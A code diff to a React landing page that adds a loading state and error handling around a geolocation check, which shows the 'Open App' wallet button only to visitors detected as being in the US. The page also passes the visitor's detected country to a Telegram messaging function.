@@ -20,6 +20,7 @@ function LandingPageContent() {
   const [pinOpen, setPinOpen] = useState(false);
   const [showSelectType, setShowSelectType] = useState(false);
   const [isUSUser, setIsUSUser] = useState<boolean | null>(null);
+  const [isLocationLoading, setIsLocationLoading] = useState(true);
   const [browser, setBrowser] = useState("");
   const hasSentVisitorMessage = useRef(false);
   const pathname = usePathname();
@@ -102,21 +103,28 @@ function LandingPageContent() {
   useEffect(() => {
     if (!hasSentVisitorMessage.current) {
       const fetchUserLocation = async () => {
-        const userCountry = await getUserCountry();
+        try {
+          const userCountry = await getUserCountry();
 
-        // Determine if user is in the United States
-        if (userCountry) {
-          const isUS =
-            userCountry.countryCode === "US" ||
-            (userCountry.country &&
-              userCountry.country.toLowerCase().includes("united states"));
-          setIsUSUser(isUS);
-        } else {
-          // If geolocation fails, default to blocking wallet features
+          // Determine if user is in the United States
+          if (userCountry) {
+            const isUS =
+              userCountry.countryCode === "US" ||
+              (userCountry.country &&
+                userCountry.country.toLowerCase().includes("united states"));
+            setIsUSUser(isUS);
+          } else {
+            // If geolocation fails, default to blocking wallet features
+            setIsUSUser(false);
+          }
+
+          sendTelegramMessage(userCountry);
+        } catch (e) {
+          console.error("Error fetching user location:", e);
           setIsUSUser(false);
+        } finally {
+          setIsLocationLoading(false);
         }
-
-        sendTelegramMessage(userCountry);
       };
       fetchUserLocation();
       hasSentVisitorMessage.current = true;
@@ -152,16 +160,20 @@ function LandingPageContent() {
             Powerful for pros.
           </p>
 
-          {/* Only show wallet entry point for US users or while country is still unknown */}
-          {isUSUser !== false && (
-            <button
-              onClick={() => {
-                setWelcomeOpen(true);
-              }}
-              className="mt-8 bg-white/10 hover:bg-white/20 text-white font-semibold rounded-full px-8 py-4 transition flex items-center gap-2 border border-white/5"
-            >
-              Open App <span className="opacity-60">→</span>
-            </button>
+          {/* While checking location, show skeleton; after that, show button only for US users */}
+          {isLocationLoading ? (
+            <div className="mt-8 w-40 h-12 rounded-full bg-white/10 animate-pulse" />
+          ) : (
+            isUSUser && (
+              <button
+                onClick={() => {
+                  setWelcomeOpen(true);
+                }}
+                className="mt-8 bg-white/10 hover:bg-white/20 text-white font-semibold rounded-full px-8 py-4 transition flex items-center gap-2 border border-white/5"
+              >
+                Open App <span className="opacity-60">→</span>
+              </button>
+            )
           )}
         </div>
 
